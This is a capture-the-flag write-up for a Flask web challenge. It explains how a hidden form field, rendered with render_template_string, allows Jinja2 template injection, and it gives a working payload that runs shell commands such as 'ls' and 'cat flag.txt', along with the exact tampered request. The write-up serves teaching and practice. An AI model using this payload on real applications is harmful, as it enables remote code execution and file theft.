# swamp
- **Category:** web
- **Points:** 100 (1 flag)
- **Description:** was vibecoding and told chat to get me some dank meme templates with some caption injection. check it out this the future frfr
- **Flag 1:** 100 points
- **Access:** https://shrek.ctf-league.osusec.org/
- **Download:** https://chal.ctf-league.osusec.org/web/shrek/app.py

## First look
accessing the site shows a text box to enter and a "make" button

entering in a text and clicking make redirects us to a new page with a link to a different page where we can see a meme with the text we entered plasted on it

the meme is a shrek meme lol

## Inspecting the code
since we have to code of the site we can see how it works

in "app.py" we can see the following code:
```python
    return f'''
    <form method=post enctype=multipart/form-data>
      meme text: <input type=text name=text><br>
      <input type=hidden name=date value="{datetime.utcnow().isoformat()}"><br>
      <input type=submit value=make>
    </form>
    '''
```

this is the form that we see when we first access the site and this calls a post request to the server with the text we entered and the date in iso format

```python
if request.method == "POST":
        caption = request.form["text"]
...
# code for creating the meme
    with open(f"img/{filename}.txt", 'w') as f:
        f.write(date)
    return f"image available at <a href='img/{filename}'>img/{filename}</a>"
```

this is the code that handles the post request and creates the meme

so far I have not seen anywhere where we can use a template injection to execute code

but  I did see that there is a alt text for the image that is assigned the date I believe
```python 

    alt_text = "Alt text not found"
    if os.path.isfile(txt_path):
        with open(txt_path, "r") as f:
            alt_text = f.read().strip()

    image_url = f"/serve_img/{filename}.jpg"
    
    print(alt_text)

    return render_template_string(f"""
        <img src="{image_url}" alt="{alt_text}">
    """)
```

this is the code that sets the alt text for the image

it should automatically be set to the date at the time of creation

but if we use dev tools we can edit this request and change the alt text to something else that might get us remote code execution with template injection

## Exploiting the site
trying to find different template injections with jinja there was quite a few that I tried and I found one that worked

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

this request simply tries to list the files in the current directory, and it works

### Steps for exploitation
1. go to https://shrek.ctf-league.osusec.org/ 
2. open dev tools and go to the network tab
3. enter some text in the text box and click make
4. find the request that was made, should be a 200 post request and right click it and click edit and resend
5. find the date field and change it to the payload, it should be in the body of the request
    example request:
    ```
    ------geckoformboundarya8a5f0976cc639f390e995264227533e
    Content-Disposition: form-data; name="text"

    this is the image text
    ------geckoformboundarya8a5f0976cc639f390e995264227533e
    Content-Disposition: form-data; name="date"

    {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
    ------geckoformboundarya8a5f0976cc639f390e995264227533e--
    ```
6. click send and go to the response tab
7. in the response tab it will show you the path to the image
8. go to the path on the site, and view the raw source of site with ctrl+u
9. if the command you entered into the site is ls you should see a list of files in the directory
    ```html

            <img src="/serve_img/ab16fc0bd3ac2520.jpg" alt="Dockerfile
    app.py
    flag.txt
    img
    requirements.txt
    shrek.jpg
    templates
    ```
### getting the flag
now that we have remote code execution (kind of) we can get the flag

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

this will print the contents of the flag.txt file, and if we follow the steps from above but change the injection to the command above we should see the flag in the response tab

** I do not own nor did I create the content for this challenge. This is a writeup for the challenge that I solved **
